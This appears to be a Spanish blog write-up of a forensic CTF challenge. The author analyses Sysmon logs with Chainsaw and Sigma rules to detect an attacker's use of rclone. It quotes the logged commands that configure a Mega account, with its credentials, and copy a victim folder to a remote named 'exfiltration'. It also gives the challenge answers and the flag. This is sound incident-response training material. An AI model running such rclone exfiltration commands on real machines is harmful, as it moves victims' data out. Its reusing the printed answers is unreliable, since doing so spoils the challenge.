---
layout: single
title: Packet Cyclone - CTF HTB Cyber Apocalypse 2023
excerpt: "Este es el quinto desafío forense del evento Cyber Apocalypse 2023 de Hack The Box. Se considera de dificultad fácil y consiste en analizar un archivo de registro de eventos de Windows (.evtx) generado por el servicio Sysmon. En este archivo se registra la ejecución sospechosa del software Rclone a través de la línea de comandos en un equipo con Windows. Nuestra tarea consiste en responder todas las preguntas solicitadas para que la plataforma de HTB nos entregue la flag del desafío."
date: 2023-03-22
classes: wide
header:
  teaser: /assets/images/htb-cyber-apocalypse-plaintext-treasure/cyber-apocalypse-ctf-2023.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - ctf
  - forense
tags:  
  - chainsaw
  - sigma rules
---

![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/cyber-apocalypse-ctf-2023.jpg)

**Dificultad:** easy

## Enunciado

_El amigo y socio de Pandora, Wade, es quien dirige la investigación sobre la ubicación de la reliquia. Recientemente, notó un tráfico extraño proveniente de su host. Eso lo llevó a creer que su host estaba comprometido. Después de una rápida investigación, se confirmó su temor. Pandora intenta ahora ver si el atacante provocó el tráfico sospechoso durante la fase de exfiltración. Pandora cree que el actor malicioso usó rclone para filtrar la investigación de Wade a la nube. Usando la herramienta llamada "chainsaw" y las reglas sigma provistas, ¿puede detectar el uso de rclone de los registros de eventos producidos por Sysmon? Para obtener la bandera, debe iniciar y conectarse al servicio docker y responder todas las preguntas correctamente._

## Archivos del desafio

Se nos entrega un archivo comprimido en formato `.zip`, que contiene una carpeta de registro de logs de Windows con 149 archivos `.evtx`, así como una segunda carpeta llamada `sigma_rules`, que contiene dos reglas sigma en formato `.yaml`. El objetivo de este desafío es utilizar la herramienta `chainsaw`, junto con las reglas sigma, para analizar todos los archivos `.evtx` de Windows y encontrar la ejecución sospechosa del software Rclone. Parece ser que este software ha sido utilizado para exfiltrar información de una computadora previamente comprometida.

La herramienta `chainsaw` esta disponible para `Linux` y `Windows` en su repositorio de [GitHub](https://github.com/WithSecureLabs/chainsaw).

En mi caso, utilizaré la versión para Linux de la herramienta `chainsaw`, y solo trabajaré con los registros presentes en el archivo `Microsoft-Windows-Sysmon Operational.evtx`. Seguiré esta arquitectura de archivos específica según lo indicado en el enunciado del desafío:
```
❯ tree
.
├── chainsaw
│   ├── chainsaw
│   ├── LICENCE
│   ├── mappings
│   │   ├── sigma-event-logs-all.yml
│   │   ├── sigma-event-logs-legacy.yml
│   │   └── sigma-mft-logs-all.yml
│   └── README.md
├── Logs
│   └── Microsoft-Windows-Sysmon%4Operational.evtx
└── sigma_rules
    ├── rclone_config_creation.yaml
    └── rclone_execution.yaml

5 directories, 9 files
```

## Chainsaw

Tal como se indica en su repositorio de GitHub, `Chainsaw` proporciona una potente capacidad de "primera respuesta" para identificar rápidamente amenazas dentro de los artefactos forenses de Windows, como los archivos `.evtx` ubicados en la ruta `C:\Windows\System32\winevt\Logs`. `Chainsaw` ofrece un método genérico y rápido para buscar palabras clave en los registros de eventos y detectar amenazas mediante la integración incorporada de las reglas de detección de Sigma y las reglas de detección personalizadas de `Chainsaw`.

En este caso, el desafío ya nos proporciona las reglas Sigma que utilizaremos, las cuales se encuentran en la carpeta `sigma_rules`. Al ejecutar la herramienta a través de la interfaz de línea de comandos (CLI), el comando se vería de la siguiente manera:
```
❯ ./chainsaw hunt ../Logs -s ../sigma_rules --mapping mappings/sigma-event-logs-all.yml
```

El comando anterior indica a la herramienta `Chainsaw` que se ejecute en modo `hunt` sobre todos los archivos dentro de la carpeta `Logs`. Luego, utiliza todas las reglas sigma proporcionadas en el desafío para la lógica de detección, y por último, utiliza el archivo `sigma-event-logs-all.yml` para el análisis de los registros.

Luego de ejecutar el comando, la salida se verá de la siguiente manera:
![](/assets/images/htb-cyber-apocalypse-packet-cyclone/chainsaw.png)

Y el detalle sería este:
```
CommandLine: '"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI'
Company: https://rclone.org 
CurrentDirectory: C:\Users\wade\AppData\Local\Temp\rclone-v161.1-windows-amd64\
Description: Rsync for cloud storage
FileVersion: 1.61.1
Hashes: SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961
Image: C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe
IntegrityLevel: Medium
LogonGuid: 10DA3E43-D892-63F8-4B6D-030000000000
LogonId: '0x36d4b'
OriginalFileName: rclone.exe
ParentCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessGuid: 10DA3E43-D8D2-63F8-9B00-000000000900
ParentProcessId: 5888
ParentUser: DESKTOP-UTDHED2\wade
ProcessGuid: 10DA3E43-D92B-63F8-B100-000000000900
ProcessId: 3820
Product: Rclone
RuleName: '-'
TerminalSessionId: 1
User: DESKTOP-UTDHED2\wade
UtcTime: 2023-02-24 15:35:07.336


CommandLine: '"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v'
Company: https://rclone.org
CurrentDirectory: C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\
Description: Rsync for cloud storage
FileVersion: 1.61.1
Hashes: SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961
Image: C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe
IntegrityLevel: Medium
LogonGuid: 10DA3E43-D892-63F8-4B6D-030000000000
LogonId: '0x36d4b'
OriginalFileName: rclone.exe
ParentCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessGuid: 10DA3E43-D8D2-63F8-9B00-000000000900
ParentProcessId: 5888
ParentUser: DESKTOP-UTDHED2\wade
ProcessGuid: 10DA3E43-D935-63F8-B200-000000000900
ProcessId: 5116
Product: Rclone
RuleName: '-'
TerminalSessionId: 1
User: DESKTOP-UTDHED2\wade
UtcTime: 2023-02-24 15:35:17.516
```

Con toda la información anterior, ya podemos conectarnos al contenedor Docker de HTB y responder las siguientes preguntas.

# Preguntas

1. ¿Cuál es el correo electrónico del atacante utilizado para el proceso de exfiltración? (por ejemplo: nombre@email.com)
Si observamos los detalles encontrados por la herramienta `Chainsaw`, podemos ver que se ha ejecutado el siguiente comando a través de PowerShell:
```
rclone.exe config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI
```
`Respuesta: majmeret@protonmail.com`

2. ¿Cuál es la contraseña del atacante utilizada para el proceso de exfiltración?
En el comando anterior, también se puede observar esta respuesta:

- `Respuesta: FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI`

3. ¿Cuál es el proveedor de almacenamiento en la nube que utiliza el atacante?
Esta respuesta la deduje por descarte, en un principio intenté encontrar alguna URL u otra pista que indicara el proveedor de nube, pero en realidad es tan simple como observar que en el comando anterior se menciona el servicio de Mega.

- `Respuesta: mega`

4. ¿Cuál es el ID del proceso utilizado por los atacantes para configurar su herramienta?
Al observar los detalles de las dos detecciones encontradas por Chainsaw, podemos identificar que la primera detección corresponde a la configuración y la segunda detección corresponde a la exfiltración. Por lo tanto, el ID de proceso de la configuración es 3820.

- `Respuesta: 3820`

5. ¿Cuál es el nombre de la carpeta que exfiltro el atacante? proporcionar la ruta completa.
Para responder a esta pregunta, debemos examinar el detalle de la segunda detección, que corresponde al proceso de exfiltración. En este caso, se ha ejecutado el siguiente comando a través de PowerShell:
```
"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
```
`Respuesta: C:\Users\Wade\Desktop\Relic_location`


6. ¿Cuál es el nombre de la carpeta a la que el atacante extrajo los archivos?
En el comando anterior, podemos observar que el destino es `remote:exfiltration`, lo que indica que el nombre de la carpeta es `exfiltration.`

- `Respuesta: exfiltration`

Luego de responder estas seis simples preguntas, el contenedor Docker de HTB nos proporcionará la flag.}

## Flag

**HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}**

